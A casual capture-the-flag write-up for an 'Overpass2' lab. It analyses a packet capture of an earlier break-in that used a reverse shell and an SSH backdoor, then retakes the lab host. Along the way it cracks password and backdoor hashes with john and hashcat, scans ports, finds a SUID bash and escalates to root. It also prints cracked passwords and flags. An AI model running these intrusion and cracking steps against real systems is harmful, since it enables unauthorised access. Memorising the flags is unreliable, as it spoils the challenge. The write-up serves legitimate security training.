### Overpass2

first, i've analyzed the "overpass2.pcapng" file with wireshark, i've never used wireshark before so its my first time. Very funny, you can see all requests and responses :D

the attackers loaded a "payload.php" and ran it to make a reverse shell.

they used some commands such as"id,whoami,ls" and "cat .overpass", and i got the hashe from .overpass from wireshark hex display

rot47 decrypt:
[{"name":"System","pass":"whenevernoteartinstant"}]

they've used this to made a backdoor too : git clone https://github.com/NinjaJc01/ssh-backdoor

after this they ran "cat /etc/shadow" because james user can use sudo. With the hashes(5) from shadow file, john broke four of them.

pass:
secret12         (?)     
abcd123          (?)     
1qaz2wsx         (?)     
secuirty3        (?)
whenevernoteartinstant (?)

users:
muirland
bee
szymex
paradox
james

i dont know the order but i dont think that james is included in this list because i've already cracked his password!

analyzing the git repository i did found two hashes:

this is a default key to ssh-backdoor
"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

"1c362db832f3f864c8c2fe05f2002a05"
and this is "salt", i dont know what is this. The word means "sal" ? i need spice to found the attackers ???? :D

after a few time i found this ssh fingerprint and the hashe that they did used in the ssh-backdoor

SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:

$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

well,it took me so long to crack it, in the function "hashpassword" inside in main code from github backdoor, i saw that the hash is created with sha512(pass + salt). Much of the time i lost trying to decypher this is because you need to change the hash above so that hashcat ou john break it.

usually i use john to crack hashes but i couldn't find this format in john, so i use hashcat.

the format that you should use is 1710 or sha512($pass. $salt.) or something like this and the hash in the file must be hash:salt

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

$ hashcat -m 1710 -a 0 -o result.txt backdoor-hash.txt /usr/share/rockyou.txt 
$ cat result.txt

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16

TIME TO ATTACK AND TAKE THE CONTROL AGAIN!

$ export ip=10.10.116.195
$ sudo nmap -sS -p- $ip -T5 -vv

i've left the nmap and gobuster running while i was analyzing the site but i'm pretty sure that i need to use the backdoor they left andd i was wrong :D 

after some time nmap found a open port in 2222 and i can get access to machine

$ ssh james@$ip -p 2222 -oHostKeyAlgorithms=+ssh-rsa
$ cat user.txt

november16 allow me to connect but i cant run sudo with this password, so, i tried to run:
$ find / -perm -4000 2>/dev/null 

to find something with suid and trying to search in the gtfobins but i found this

"/home/james/.suid_bash"

what is this? i dont know :D but this running with root privilege. I trying to run but i just receive a shell with normal privileges so i couldn't find anything interesting.

after a some time researching, i discovered that i just need to include -p flag and run the elfi suid file :D

$ ./.suid_bash -p
# cat ../../root/root.txt 

it was very nice, i had fun a lot with forensics and the analyse part :D

u: thm{d119b4fa8c497ddb0525f7ad200e6567}
r: thm{d53b2684f169360bb9606c333873144d}






